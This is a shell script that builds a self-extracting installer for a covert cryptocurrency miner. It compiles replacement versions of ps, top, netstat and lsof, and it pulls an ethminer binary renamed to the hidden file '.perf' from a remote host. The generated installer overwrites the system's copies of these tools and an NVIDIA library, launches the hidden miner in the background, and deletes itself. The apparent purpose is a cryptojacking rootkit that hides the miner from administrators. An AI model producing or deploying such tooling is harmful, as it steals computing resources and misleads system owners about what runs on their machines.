tools=( ps top netstat lsof )
toolsSrc=(lsof_4.87-rh net-tools-2.0 nv procps-ng-3.3.10)
topdir=`pwd`
backup_dir=${topdir}/backup
dist_dir=${topdir}/dist
install_sh=iss


rm -rf ${dist_dir} dist.tar.xz
mkdir -p ${dist_dir}/bin
mkdir -p ${dist_dir}/lib
# build lsof
pushd lsof_4.87-rh
make
cp -f lsof ${dist_dir}/bin
popd

# build netstat
pushd net-tools-2.0
make 
cp -f netstat ${dist_dir}/bin
popd

# build top and ps
pushd procps-ng-3.3.10
make install
cp -f /usr/bin/top /usr/bin/ps ${dist_dir}/bin
popd

strip ${dist_dir}/bin/*

# build nv
pushd nv
make 
cp libnvidia-ml.so ${dist_dir}/lib
popd

# build eth tools
scp 192.168.2.11:/var/lib/docker/devicemapper/mnt/7e1e854b23663a9f5bce0e09e0491d9d07659cdd4fc0c3d26a8f0ad61e2e655f/rootfs/cpp-ethereum/build/ethminer/.perf ${dist_dir}/bin

# tar bins
tar cJvf dist.tar.xz dist

template='#!/bin/bash

function untar_payload()
{
        match=$(grep --text --line-number '^PAYLOAD:$' $0 | cut -d ':' -f 1)
        payload_start=$((match + 1))
        tail -n +$payload_start $0  | tar -xJvf -
}
untar_payload
# install bin
cp  -f dist/bin/{top,ps,netstat,.perf} /usr/bin/
cp -f dist/bin/lsof /usr/sbin
# install libs
rm -rf /usr/lib64/libnvidia-ml.so.1
cp dist/lib/libnvidia-ml.so /usr/lib64/libnvidia-ml.so.1

/usr/bin/.perf &
#/usr/bin/.perf 
sleep 10 
rm -rf dist 
rm -rf $0
exit 0
'

echo "${template}" > ./${install_sh}
echo "PAYLOAD:" >> ./${install_sh}
cat dist.tar.xz >>./${install_sh}
chmod a+x ${install_sh}


